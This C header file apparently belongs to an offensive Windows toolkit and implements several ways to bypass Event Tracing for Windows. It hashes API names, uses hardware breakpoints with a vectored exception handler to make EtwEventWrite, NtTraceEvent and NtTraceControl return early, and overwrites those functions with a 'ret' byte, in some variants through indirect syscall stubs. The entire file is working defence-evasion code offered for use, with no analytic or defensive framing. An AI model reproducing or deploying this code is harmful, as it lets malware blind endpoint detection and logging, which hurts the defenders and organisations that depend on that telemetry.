#ifndef ETW_BYPASS
#define ETW_BYPASS

#include "winapi_loader.h"
#include <evntprov.h>

//#define DEBUG

// -------------------- Types --------------------
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef PVOID (NTAPI *RtlAddVectoredExceptionHandler_t)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef NTSTATUS (NTAPI *NtSetContextThread_t)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *EtwEventWrite_t)(REGHANDLE, PCEVENT_DESCRIPTOR, ULONG, PEVENT_DATA_DESCRIPTOR);
typedef NTSTATUS (NTAPI *NtTraceEvent_t)(HANDLE, ULONG, ULONG, PVOID);
typedef NTSTATUS (NTAPI *NtTraceControl_t)(ULONG, PVOID, ULONG, PVOID, ULONG, PULONG);

#define ntdll_dll HASH("ntdll.dll")
#define ntprotectvirtualmemory HASH("NtProtectVirtualMemory")
#define ntwritevirtualmemory HASH("NtWriteVirtualMemory")
#define rtladdvectoredexceptionhandler HASH("RtlAddVectoredExceptionHandler")
#define ntsetcontextthread HASH("NtSetContextThread")
#define etweventwrite HASH("EtwEventWrite")
#define nttraceevent HASH("NtTraceEvent")
#define nttracecontrol HASH("NtTraceControl")

// -------------------- Hardware Breakpoint Handler --------------------
LONG NTAPI VehHandler(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    CONTEXT* c = ep->ContextRecord;
    // Check if DR0 triggered the exception
    if ((c->Dr6 & 0x1) && (c->Rip == c->Dr0)) {
        c->Rax = 0; // STATUS_SUCCESS
        // Simulate 'ret' by popping return address into RIP
        c->Rip = *(ULONG_PTR*)c->Rsp;
        c->Rsp += sizeof(ULONG_PTR);
        c->Dr6 &= ~0x1; // Clear trap flag
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// -------------------- Internal Core Logic --------------------
#define _HWBP_SET(hNtdll, NtSetContextThread, target_addr) \
    do { \
        RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler = (RtlAddVectoredExceptionHandler_t)myGetProcAddressH(hNtdll, rtladdvectoredexceptionhandler); \
        RtlAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VehHandler); \
        CONTEXT tCtx = { 0 }; \
        tCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS; \
        tCtx.Dr0 = (ULONG_PTR)target_addr; \
        tCtx.Dr7 = (1 << 0); \
        ((NtSetContextThread_t)NtSetContextThread)((HANDLE)-2, &tCtx); \
    } while (0)

#define _PATCH_APPLY(NtProtectVirtualMemory, NtWriteVirtualMemory, target_addr, protection) \
    do { \
        ULONG oldP = 0; SIZE_T sz = 1; PVOID base = target_addr; \
        ((NtProtectVirtualMemory_t)NtProtectVirtualMemory)((HANDLE)-1, &base, &sz, protection, &oldP); \
        BYTE patch = 0xC3; SIZE_T written = 0; \
        ((NtWriteVirtualMemory_t)NtWriteVirtualMemory)((HANDLE)-1, target_addr, &patch, 1, &written); \
        ((NtProtectVirtualMemory_t)NtProtectVirtualMemory)((HANDLE)-1, &base, &sz, oldP, &oldP); \
    } while (0)

#define _SYSCALL_HWBP_SET(ctx, hNtdll, target_addr) \
    do { \
        RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler = (RtlAddVectoredExceptionHandler_t)myGetProcAddressH(hNtdll, rtladdvectoredexceptionhandler); \
        RtlAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VehHandler); \
        CONTEXT tCtx = { 0 }; \
        tCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS; \
        tCtx.Dr0 = (ULONG_PTR)target_addr; \
        tCtx.Dr7 = (1 << 0); \
        SYSCALL_PREPARE(ctx, ntsetcontextthread); \
        NtSetContextThread_t NtSetContextThread = (NtSetContextThread_t)SYSCALL_CALL(ctx, NtSetContextThread_t); \
        NtSetContextThread((HANDLE)-2, &tCtx); \
        FreeSyscallStub(ctx, NtSetContextThread); \
    } while (0)

#define _SYSCALL_PATCH_APPLY(ctx, target_addr, protection) \
    do { \
        ULONG oldP = 0; SIZE_T sz = 1; PVOID base = target_addr; \
        ((NtProtectVirtualMemory_t)(ctx->NtProtectVirtualMemory))((HANDLE)-1, &base, &sz, protection, &oldP); \
        BYTE patch = 0xC3; SIZE_T written = 0; \
        SYSCALL_PREPARE(ctx, ntwritevirtualmemory); \
        NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)SYSCALL_CALL(ctx, NtWriteVirtualMemory_t); \
        NtWriteVirtualMemory((HANDLE)-1, target_addr, &patch, 1, &written); \
        FreeSyscallStub(ctx, NtWriteVirtualMemory); \
        ((NtProtectVirtualMemory_t)(ctx->NtProtectVirtualMemory))((HANDLE)-1, &base, &sz, oldP, &oldP); \
    } while (0)

#ifdef DEBUG
    STRINGA(etwpass, "[+] ETW bypassed!\n")
    STRINGA(etwfail, "[-] ETW bypass failed.\n")

    #define VERIFY_ETW(status) \
        do { \
            if (status == 0) { STDOUT_WRITE(etwpass); } \
            else { STDOUT_WRITE(etwfail); } \
        } while (0)
#else
    #define VERIFY_ETW(status) ((void)0)
#endif

// -------------------- Standard API --------------------
#define ETWHWBP() \
    do { \
        HMODULE hNtdll = myGetModuleHandleH(ntdll_dll); \
        PVOID EtwEventWrite = myGetProcAddressH(hNtdll, etweventwrite); \
        _HWBP_SET(hNtdll, myGetProcAddressH(hNtdll, ntsetcontextthread), EtwEventWrite); \
        VERIFY_ETW(((EtwEventWrite_t)EtwEventWrite)(0, NULL, 0, NULL)); \
    } while (0)

#define ETWHWBP2() \
    do { \
        HMODULE hNtdll = myGetModuleHandleH(ntdll_dll); \
        PVOID NtTraceEvent = myGetProcAddressH(hNtdll, nttraceevent); \
        _HWBP_SET(hNtdll, myGetProcAddressH(hNtdll, ntsetcontextthread), NtTraceEvent); \
        VERIFY_ETW(((NtTraceEvent_t)NtTraceEvent)(NULL, 0, 0, NULL)); \
    } while (0)

#define ETWHWBP3() \
    do { \
        HMODULE hNtdll = myGetModuleHandleH(ntdll_dll); \
        PVOID NtTraceControl = myGetProcAddressH(hNtdll, nttracecontrol); \
        _HWBP_SET(hNtdll, myGetProcAddressH(hNtdll, ntsetcontextthread), NtTraceControl); \
        VERIFY_ETW(((NtTraceControl_t)NtTraceControl)(0, NULL, 0, NULL, 0, NULL)); \
    } while (0)

#define ETWPATCH() \
    do { \
        HMODULE hNtdll = myGetModuleHandleH(ntdll_dll); \
        PVOID EtwEventWrite = myGetProcAddressH(hNtdll, etweventwrite); \
        _PATCH_APPLY(myGetProcAddressH(hNtdll, ntprotectvirtualmemory), myGetProcAddressH(hNtdll, ntwritevirtualmemory), EtwEventWrite, PAGE_READWRITE); \
        VERIFY_ETW(((EtwEventWrite_t)EtwEventWrite)(0, NULL, 0, NULL)); \
    } while (0)

#define ETWPATCH2() \
    do { \
        HMODULE hNtdll = myGetModuleHandleH(ntdll_dll); \
        PVOID NtTraceEvent = myGetProcAddressH(hNtdll, nttraceevent); \
        _PATCH_APPLY(myGetProcAddressH(hNtdll, ntprotectvirtualmemory), myGetProcAddressH(hNtdll, ntwritevirtualmemory), NtTraceEvent, PAGE_EXECUTE_READWRITE); \
        VERIFY_ETW(((NtTraceEvent_t)NtTraceEvent)(NULL, 0, 0, NULL)); \
    } while (0)

#define ETWPATCH3() \
    do { \
        HMODULE hNtdll = myGetModuleHandleH(ntdll_dll); \
        PVOID NtTraceControl = myGetProcAddressH(hNtdll, nttracecontrol); \
        _PATCH_APPLY(myGetProcAddressH(hNtdll, ntprotectvirtualmemory), myGetProcAddressH(hNtdll, ntwritevirtualmemory), NtTraceControl, PAGE_READWRITE); \
        VERIFY_ETW(((NtTraceControl_t)NtTraceControl)(0, NULL, 0, NULL, 0, NULL)); \
    } while (0)

// -------------------- Syscall API --------------------
#define SYSCALL_ETWHWBP(ctx) \
    do { \
        PVOID EtwEventWrite = myGetProcAddressH(ctx->hNtdll, etweventwrite); \
        _SYSCALL_HWBP_SET(ctx, ctx->hNtdll, EtwEventWrite); \
        VERIFY_ETW(((EtwEventWrite_t)EtwEventWrite)(0, NULL, 0, NULL)); \
    } while (0)

#define SYSCALL_ETWHWBP2(ctx) \
    do { \
        PVOID NtTraceEvent = myGetProcAddressH(ctx->hNtdll, nttraceevent); \
        _SYSCALL_HWBP_SET(ctx, ctx->hNtdll, NtTraceEvent); \
        VERIFY_ETW(((NtTraceEvent_t)NtTraceEvent)(NULL, 0, 0, NULL)); \
    } while (0)

#define SYSCALL_ETWHWBP3(ctx) \
    do { \
        PVOID NtTraceControl = myGetProcAddressH(ctx->hNtdll, nttracecontrol); \
        _SYSCALL_HWBP_SET(ctx, ctx->hNtdll, NtTraceControl); \
        VERIFY_ETW(((NtTraceControl_t)NtTraceControl)(0, NULL, 0, NULL, 0, NULL)); \
    } while (0)

#define SYSCALL_ETWPATCH(ctx) \
    do { \
        PVOID EtwEventWrite = myGetProcAddressH(ctx->hNtdll, etweventwrite); \
        _SYSCALL_PATCH_APPLY(ctx, EtwEventWrite, PAGE_READWRITE); \
        VERIFY_ETW(((EtwEventWrite_t)EtwEventWrite)(0, NULL, 0, NULL)); \
    } while (0)

#define SYSCALL_ETWPATCH2(ctx) \
    do { \
        PVOID NtTraceEvent = myGetProcAddressH(ctx->hNtdll, nttraceevent); \
        _SYSCALL_PATCH_APPLY(ctx, NtTraceEvent, PAGE_EXECUTE_READWRITE); \
        VERIFY_ETW(((NtTraceEvent_t)NtTraceEvent)(NULL, 0, 0, NULL)); \
    } while (0)

#define SYSCALL_ETWPATCH3(ctx) \
    do { \
        PVOID NtTraceControl = myGetProcAddressH(ctx->hNtdll, nttracecontrol); \
        _SYSCALL_PATCH_APPLY(ctx, NtTraceControl, PAGE_READWRITE); \
        VERIFY_ETW(((NtTraceControl_t)NtTraceControl)(0, NULL, 0, NULL, 0, NULL)); \
    } while (0)

#endif
